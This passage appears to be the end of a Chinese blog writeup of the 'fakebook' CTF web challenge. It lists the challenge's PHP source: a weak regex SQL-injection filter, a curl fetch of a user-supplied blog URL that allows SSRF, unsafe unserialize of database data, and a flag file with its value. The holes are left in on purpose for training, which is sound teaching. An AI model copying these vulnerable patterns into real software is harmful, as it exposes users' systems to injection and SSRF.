  &#125;</span><br><span class="line"></span><br><span class="line">    public function anti_sqli($no) &#123;</span><br><span class="line">        $patterns &#x3D; &quot;&#x2F;union\Wselect|0x|hex&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line">        return preg_match($patterns, $no);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">CREATE TABLE &#96;users&#96; ( &#96;no&#96; INT NOT NULL AUTO_INCREMENT , &#96;username&#96; VARCHAR(100) NOT NULL , &#96;passwd&#96; VARCHAR(128) NOT NULL , &#96;data&#96; TEXT NOT NULL , PRIMARY KEY (&#96;no&#96;)) ENGINE &#x3D; MyISAM;</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="user-php"><a href="#user-php" class="headerlink" title="user.php"></a>user.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="lib-php"><a href="#lib-php" class="headerlink" title="lib.php"></a>lib.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sha512($data)</span><br><span class="line">&#123;</span><br><span class="line">    return hash(&#39;sha512&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function xss($data)</span><br><span class="line">&#123;</span><br><span class="line">    return htmlspecialchars($data, ENT_QUOTES, &#39;UTF-8&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function anti_object_injection($unserializedData)</span><br><span class="line">&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;O:&#x2F;i&quot;, $unserializedData))</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="bootstrap-php"><a href="#bootstrap-php" class="headerlink" title="bootstrap.php"></a>bootstrap.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;bootstrap.min.css&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;jquery-3.3.1.slim.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;popper.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="view-php"><a href="#view-php" class="headerlink" title="view.php"></a>view.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;?php require_once &#39;db.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;user.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;error.php&#39;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$db &#x3D; new DB();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;User&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php require_once &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$no &#x3D; $_GET[&#39;no&#39;];</span><br><span class="line">if ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;no hack ~_~&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res &#x3D; $db-&gt;getUserByNo($no);</span><br><span class="line">$user &#x3D; unserialize($res[&#39;data&#39;]);</span><br><span class="line">&#x2F;&#x2F;print_r($res);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;&#x2F;th&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $res[&#39;username&#39;]; ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class="line">            &lt;&#x2F;td&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his&#x2F;her blog&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    $response &#x3D; $user-&gt;getBlogContents();</span><br><span class="line">    if ($response &#x3D;&#x3D;&#x3D; 404)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;404 Not found&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $base64 &#x3D; base64_encode($response);</span><br><span class="line">        echo &quot;&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,&#123;$base64&#125;&#39;&gt;&quot;;</span><br><span class="line">        &#x2F;&#x2F; echo $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; var_dump($user-&gt;getBlogContents());</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="error-php"><a href="#error-php" class="headerlink" title="error.php"></a>error.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 1);</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">&#x2F;&#x2F; ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="join-php"><a href="#join-php" class="headerlink" title="join.php"></a>join.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Join&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php include &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Join&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;join.ok.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    username</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; maxlength&#x3D;&quot;100&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    passwd :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;passwd&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    age :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;age&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-1&quot;&gt;</span><br><span class="line">                    blog :</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;blog&quot; class&#x3D;&quot;form-control&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;join&quot; class&#x3D;&quot;btn btn-info&quot;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>r0yanx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ryaninf.github.io/2020/11/17/fakebook-writeup/" title="fakebook-writeup">https://ryaninf.github.io/2020/11/17/fakebook-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"># 攻防世界</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97/" rel="tag"># 反序列</a>
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/17/give-you-flag-writeup/" rel="prev" title="give_you_flag-writeup">
+      <i class="fa fa-chevron-left"></i> give_you_flag-writeup
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTQyMS8yMTkzMw=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">非预期解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">题目源码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#index-php"><span class="nav-number">4.1.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#db-php"><span class="nav-number">4.2.</span> <span class="nav-text">db.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#user-php"><span class="nav-number">4.3.</span> <span class="nav-text">user.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lib-php"><span class="nav-number">4.4.</span> <span class="nav-text">lib.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bootstrap-php"><span class="nav-number">4.5.</span> <span class="nav-text">bootstrap.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#view-php"><span class="nav-number">4.6.</span> <span class="nav-text">view.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#error-php"><span class="nav-number">4.7.</span> <span class="nav-text">error.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag-php"><span class="nav-number">4.8.</span> <span class="nav-text">flag.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#join-php"><span class="nav-number">4.9.</span> <span class="nav-text">join.php</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="r0yanx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">r0yanx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ryanInf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ryanInf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ryaninf@outlook.com" title="E-Mail → mailto:ryaninf@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.freebuf.com/author/r0yanx" title="FreeBuf → https:&#x2F;&#x2F;www.freebuf.com&#x2F;author&#x2F;r0yanx" rel="noopener" target="_blank"><i class="fab fa-fw"></i>FreeBuf</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r0yanx</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
